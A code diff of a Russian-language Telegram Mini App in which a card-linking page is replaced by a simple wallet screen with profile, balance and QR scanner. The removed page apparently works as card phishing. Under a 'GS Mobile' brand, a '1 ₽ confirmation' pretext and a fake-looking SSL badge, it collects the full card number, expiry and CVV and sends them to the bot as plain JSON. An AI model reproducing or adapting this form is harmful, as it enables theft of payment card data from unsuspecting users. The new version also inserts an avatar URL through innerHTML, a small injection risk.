@@ -2,8 +2,8 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Привязка карты - GS Mobile</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Telegram Mini App</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
@@ -11,411 +11,258 @@
             padding: 0;
             box-sizing: border-box;
         }
-        
-        html, body {
-            height: 100%;
-            overflow: hidden;
-        }
-        
+
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: #0d0d0d;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: var(--tg-theme-bg-color, #17212b);
+            color: var(--tg-theme-text-color, #ffffff);
+            min-height: 100vh;
+            padding: 16px;
+        }
+
+        .profile-header {
             display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            padding: 16px;
-            color: #fff;
-        }
-        
-        .container {
-            background: #1a1a1a;
-            border-radius: 20px;
-            padding: 24px;
-            width: 100%;
-            max-width: 360px;
-            border: 1px solid #2a2a2a;
-        }
-        
-        .logo {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        
-        .logo h1 {
-            color: #00d4aa;
-            font-size: 22px;
-            font-weight: 700;
-            margin-bottom: 4px;
-        }
-        
-        .logo p {
-            color: #888;
-            font-size: 12px;
-        }
-        
-        .info-text {
-            text-align: center;
-            color: #aaa;
-            font-size: 14px;
-            margin-bottom: 20px;
-            line-height: 1.5;
-            padding: 35px;
-            background-color: rgba(0,0,0,0.2);
-            border-radius: 13px 13px 5px 5px;
-        }
-        
-        .amount-badge {
-            display: inline-block;
-            background: rgba(0, 212, 170, 0.15);
-            color: #00d4aa;
-            padding: 4px 12px;
-            border-radius: 16px;
-            font-weight: 600;
-            font-size: 12px;
-            margin-top: 8px;
-            border: 1px solid rgba(0, 212, 170, 0.3);
-        }
-        
-        .form-group {
-            margin-bottom: 16px;
-        }
-        
-        .form-group label {
-            display: block;
-            margin-bottom: 8px;
-            color: #ccc;
-            font-size: 11px;
-            font-weight: 500;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        
-        .form-group input {
-            width: 100%;
-            padding: 14px 17px;
-            background: #0d0d0d;
-            border: 2px solid #2a2a2a;
-            border-radius: 12px;
-            font-size: 16px;
-            color: #fff;
-            transition: all 0.3s ease;
-            outline: none;
-            letter-spacing: 2px;
-            font-weight: 500;
-        }
-        
-        .form-group input:focus {
-            border-color: #00d4aa;
-            background: #141414;
-        }
-        
-        .form-group input.error {
-            border-color: #ff4757;
-            animation: shake 0.5s;
-        }
-        
-        .form-group input.valid {
-            border-color: #00d4aa;
-        }
-        
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-10px); }
-            75% { transform: translateX(10px); }
-        }
-        
-        .form-row {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
+            align-items: center;
             gap: 12px;
+            margin-bottom: 24px;
         }
-        
-        .submit-btn {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #00d4aa 0%, #00a884 100%);
-            color: #0d0d0d;
+
+        .qr-btn {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background-color: var(--tg-theme-secondary-bg-color, #242f3d);
             border: none;
-            border-radius: 12px;
-            font-size: 15px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 4px;
-        }
-        
-        .submit-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 30px rgba(0, 212, 170, 0.3);
-        }
-        
-        .submit-btn:disabled {
-            background: #2a2a2a;
-            color: #666;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-        
-        .secure-badge {
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-top: 16px;
-            color: #666;
-            font-size: 11px;
+            cursor: pointer;
+            flex-shrink: 0;
+            transition: opacity 0.2s;
         }
-        
-        .secure-badge svg {
-            width: 14px;
-            height: 14px;
-            margin-right: 6px;
-            fill: #00d4aa;
+
+        .qr-btn:active {
+            opacity: 0.7;
         }
-        
-        .step-indicator {
+
+        .qr-btn svg {
+            width: 24px;
+            height: 24px;
+            fill: var(--tg-theme-text-color, #ffffff);
+        }
+
+        .profile-info {
             display: flex;
-            justify-content: center;
-            gap: 6px;
-            margin-bottom: 20px;
+            align-items: center;
+            gap: 12px;
+            background-color: var(--tg-theme-secondary-bg-color, #242f3d);
+            border-radius: 24px;
+            padding: 6px 16px 6px 6px;
+            flex: 1;
         }
-        
-        .step {
-            width: 6px;
-            height: 6px;
+
+        .avatar {
+            width: 40px;
+            height: 40px;
             border-radius: 50%;
-            background: #2a2a2a;
-            transition: all 0.3s ease;
+            background-color: var(--tg-theme-button-color, #2b9ce1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            font-weight: 600;
+            color: #ffffff;
+            flex-shrink: 0;
+            overflow: hidden;
         }
-        
-        .step.active {
-            background: #00d4aa;
-            width: 20px;
-            border-radius: 3px;
+
+        .avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
-        
-        .hidden {
-            display: none !important;
+
+        .user-details {
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
         }
-        
-        .card-hint {
+
+        .user-name {
+            font-size: 15px;
+            font-weight: 600;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .user-username {
+            font-size: 13px;
+            color: var(--tg-theme-hint-color, #7d8b99);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        /* Остальная часть интерфейса */
+        .balance-section {
             text-align: center;
-            color: #666;
-            font-size: 11px;
-            margin-top: 6px;
+            margin-bottom: 24px;
+        }
+
+        .balance {
+            font-size: 42px;
+            font-weight: 700;
+            margin-bottom: 16px;
+        }
+
+        .actions {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+        }
+
+        .btn {
+            padding: 12px 24px;
+            border-radius: 24px;
+            border: none;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        .btn:active {
+            opacity: 0.8;
+        }
+
+        .btn-primary {
+            background-color: var(--tg-theme-button-color, #2b9ce1);
+            color: var(--tg-theme-button-text-color, #ffffff);
+        }
+
+        .btn-secondary {
+            background-color: var(--tg-theme-secondary-bg-color, #242f3d);
+            color: var(--tg-theme-text-color, #ffffff);
+        }
+
+        .history-section {
+            background-color: var(--tg-theme-secondary-bg-color, #242f3d);
+            border-radius: 24px;
+            padding: 20px;
+        }
+
+        .history-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .history-title {
+            font-size: 17px;
+            font-weight: 600;
+        }
+
+        .history-all {
+            font-size: 15px;
+            color: var(--tg-theme-button-color, #2b9ce1);
+            cursor: pointer;
+        }
+
+        .history-empty {
+            background-color: var(--tg-theme-bg-color, #17212b);
+            border-radius: 16px;
+            height: 200px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        
-        <div class="info-text">
-            Для подтверждения с Вашего баланса будет списано<br>
-            <span class="amount-badge">1 ₽</span><br>
-        </div>
-        
-        <div class="step-indicator">
-            <div class="step active" id="step1"></div>
-            <div class="step" id="step2"></div>
-        </div>
-        
-        <form id="cardForm">
-            <div id="step1-content">
-                <div class="form-group">
-                    <label for="cardNumber">Номер карты</label>
-                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="off" inputmode="numeric">
-                </div>
-                <div class="card-hint">16 цифр на лицевой стороне</div>
+
+    <!-- Верхняя панель: QR + Профиль -->
+    <div class="profile-header">
+        <button class="qr-btn" id="qrScanner" title="Сканировать QR">
+            <svg viewBox="0 0 24 24">
+                <path d="M3 11h8V3H3v8zm2-6h4v4H5V5zM3 21h8v-8H3v8zm2-6h4v4H5v-4zM13 3v8h8V3h-8zm6 6h-4V5h4v4zM13 13h2v2h-2zM15 15h2v2h-2zM13 17h2v2h-2zM17 13h2v2h-2zM19 15h2v2h-2zM17 17h2v2h-2zM15 19h2v2h-2zM19 19h2v2h-2z"/>
+            </svg>
+        </button>
+
+        <div class="profile-info">
+            <div class="avatar" id="userAvatar">N</div>
+            <div class="user-details">
+                <div class="user-name" id="userName">Name</div>
+                <div class="user-username" id="userUsername">@username</div>
             </div>
-            
-            <div id="step2-content" class="hidden">
-                <div class="form-row">
-                    <div class="form-group">
-                        <label for="expiry">Срок</label>
-                        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric">
-                    </div>
-                    <div class="form-group">
-                        <label for="cvv">CVV</label>
-                        <input type="password" id="cvv" placeholder="123" maxlength="3" inputmode="numeric">
-                    </div>
-                </div>
-            </div>
-            
-            <button type="submit" class="submit-btn" id="submitBtn" disabled>Продолжить</button>
-        </form>
-        
-        <div class="secure-badge">
-            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
-            Защищено 256-bit SSL
         </div>
     </div>
 
+    <!-- Баланс -->
+    <div class="balance-section">
+        <div class="balance" id="balance">0,00 ₽</div>
+        <div class="actions">
+            <button class="btn btn-primary">+ Пополнить</button>
+            <button class="btn btn-secondary">Перевести</button>
+        </div>
+    </div>
+
+    <!-- История -->
+    <div class="history-section">
+        <div class="history-header">
+            <div class="history-title">История операций</div>
+            <div class="history-all">Все</div>
+        </div>
+        <div class="history-empty"></div>
+    </div>
+
     <script>
+        // Инициализация Telegram WebApp
         const tg = window.Telegram.WebApp;
+
+        // Настройка внешнего вида
         tg.ready();
-        
-        // Не раскрываем на полный экран, устанавливаем компактную высоту
-        // tg.expand(); — убрано
-        
-        // Устанавливаем цвета
-        tg.setHeaderColor('#0d0d0d');
-        tg.setBackgroundColor('#0d0d0d');
-        
-        // Отключаем вертикальную прокрутку
-        tg.disableVerticalSwipes();
-        
-        const cardNumber = document.getElementById('cardNumber');
-        const expiry = document.getElementById('expiry');
-        const cvv = document.getElementById('cvv');
-        const submitBtn = document.getElementById('submitBtn');
-        const step1Content = document.getElementById('step1-content');
-        const step2Content = document.getElementById('step2-content');
-        const step1Indicator = document.getElementById('step1');
-        const step2Indicator = document.getElementById('step2');
-        
-        let currentStep = 1;
-        let cardValid = false;
-        let dateValid = false;
-        let cvvValid = false;
-        
-        function luhnCheck(cardNumber) {
-            let sum = 0;
-            let isEven = false;
-            
-            for (let i = cardNumber.length - 1; i >= 0; i--) {
-                let digit = parseInt(cardNumber.charAt(i), 10);
-                
-                if (isEven) {
-                    digit *= 2;
-                    if (digit > 9) digit -= 9;
-                }
-                
-                sum += digit;
-                isEven = !isEven;
-            }
-            
-            return sum % 10 === 0;
-        }
-        
-        cardNumber.addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\D/g, '');
-            let formatted = '';
-            
-            for (let i = 0; i < value.length && i < 16; i++) {
-                if (i > 0 && i % 4 === 0) formatted += ' ';
-                formatted += value[i];
-            }
-            
-            e.target.value = formatted;
-            
-            if (value.length === 16) {
-                if (luhnCheck(value)) {
-                    cardNumber.classList.remove('error');
-                    cardNumber.classList.add('valid');
-                    cardValid = true;
-                    updateSubmitButton();
-                    setTimeout(() => goToStep2(), 300);
-                } else {
-                    cardNumber.classList.remove('valid');
-                    cardNumber.classList.add('error');
-                    cardValid = false;
-                    updateSubmitButton();
-                }
+        tg.expand();
+        tg.setHeaderColor(tg.themeParams.bg_color || '#17212b');
+
+        // Получение данных пользователя
+        const user = tg.initDataUnsafe?.user;
+
+        if (user) {
+            // Имя
+            const fullName = [user.first_name, user.last_name].filter(Boolean).join(' ');
+            document.getElementById('userName').textContent = fullName || 'Name';
+
+            // Юзернейм
+            document.getElementById('userUsername').textContent = user.username ? '@' + user.username : '@username';
+
+            // Аватарка
+            const avatarEl = document.getElementById('userAvatar');
+            if (user.photo_url) {
+                avatarEl.innerHTML = `<img src="${user.photo_url}" alt="avatar">`;
             } else {
-                cardNumber.classList.remove('error', 'valid');
-                cardValid = false;
-                updateSubmitButton();
-            }
-        });
-        
-        function goToStep2() {
-            currentStep = 2;
-            step1Content.classList.add('hidden');
-            step2Content.classList.remove('hidden');
-            step1Indicator.classList.remove('active');
-            step2Indicator.classList.add('active');
-            submitBtn.textContent = 'Привязать карту';
-            expiry.focus();
-            updateSubmitButton();
-        }
-        
-        expiry.addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\D/g, '');
-            
-            if (value.length >= 2) {
-                let month = parseInt(value.substring(0, 2));
-                if (month > 12) value = '12' + value.substring(2);
-                if (month === 0) value = '01' + value.substring(2);
-                value = value.substring(0, 2) + '/' + value.substring(2, 4);
-            }
-            
-            e.target.value = value;
-            
-            if (value.length === 5) {
-                let parts = value.split('/');
-                let month = parseInt(parts[0]);
-                let year = parseInt(parts[1]);
-                let currentYear = new Date().getFullYear() % 100;
-                let currentMonth = new Date().getMonth() + 1;
-                
-                if (year > currentYear || (year === currentYear && month >= currentMonth)) {
-                    dateValid = true;
-                    expiry.classList.add('valid');
-                    setTimeout(() => cvv.focus(), 100);
-                } else {
-                    dateValid = false;
-                    expiry.classList.remove('valid');
-                }
-            } else {
-                dateValid = false;
-                expiry.classList.remove('valid');
-            }
-            
-            updateSubmitButton();
-        });
-        
-        cvv.addEventListener('input', (e) => {
-            e.target.value = e.target.value.replace(/\D/g, '');
-            cvvValid = e.target.value.length === 3;
-            
-            if (cvvValid) {
-                cvv.classList.add('valid');
-            } else {
-                cvv.classList.remove('valid');
-            }
-            
-            updateSubmitButton();
-        });
-        
-        function updateSubmitButton() {
-            if (currentStep === 1) {
-                submitBtn.disabled = !cardValid;
-            } else {
-                submitBtn.disabled = !(dateValid && cvvValid);
+                avatarEl.textContent = (user.first_name?.[0] || 'N').toUpperCase();
             }
         }
-        
-        document.getElementById('cardForm').addEventListener('submit', (e) => {
-            e.preventDefault();
-            
-            if (currentStep === 1 && cardValid) {
-                goToStep2();
-                return;
-            }
-            
-            if (currentStep === 2 && dateValid && cvvValid) {
-                const cardData = {
-                    card_number: cardNumber.value.replace(/\s/g, ''),
-                    expiry: expiry.value,
-                    cvv: cvv.value
-                };
-                
-                tg.sendData(JSON.stringify(cardData));
-                tg.close();
+
+        // Кнопка сканера QR
+        document.getElementById('qrScanner').addEventListener('click', () => {
+            if (tg.showScanQrPopup) {
+                tg.showScanQrPopup({
+                    text: 'Наведите камеру на QR-код'
+                }, (text) => {
+                    // Обработка отсканированного текста
+                    tg.showAlert('Отсканировано: ' + text);
+                    return true; // Закрыть popup после сканирования
+                });
+            } else {
+                tg.showAlert('Сканер QR недоступен на этом устройстве');
             }
         });
-        
-        updateSubmitButton();
+
+        // Обработка события сканирования (если используется через MainButton)
+        tg.onEvent('qrTextReceived', (data) => {
+            console.log('QR scanned:', data);
+        });
     </script>
+
 </body>
 </html>
